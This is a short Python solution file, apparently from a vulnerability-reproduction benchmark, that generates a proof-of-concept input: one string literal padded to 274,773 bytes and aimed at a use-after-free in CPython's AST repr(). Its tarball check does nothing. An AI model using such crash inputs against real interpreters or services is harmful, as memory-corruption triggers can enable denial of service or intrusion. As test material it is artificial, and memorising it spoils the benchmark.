import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: construct a Python source snippet that exercises ast.parse() and repr(AST)
        # using a very large constant string literal. This targets the use-after-free in AST repr().
        # We match the ground-truth PoC size to improve reliability.
        target_len = 274773

        # Attempt to detect CPython source for sanity (not strictly required)
        try:
            if os.path.isfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    names = tf.getnames()
                    # If CPython indicators are present, proceed (fallback to same payload otherwise)
                    _ = any(
                        ("Lib/ast.py" in names_item) or ("Python/ast.c" in names_item)
                        for names_item in names
                    )
        except Exception:
            pass

        # Compose a valid Python expression consisting solely of a large string literal.
        # This should be valid in both 'exec' and 'eval' parse modes.
        if target_len < 2:
            # Fallback minimum valid Python code if target_len is unexpectedly small
            return b"''"

        body_len = target_len - 2
        return b"'" + (b"A" * body_len) + b"'"
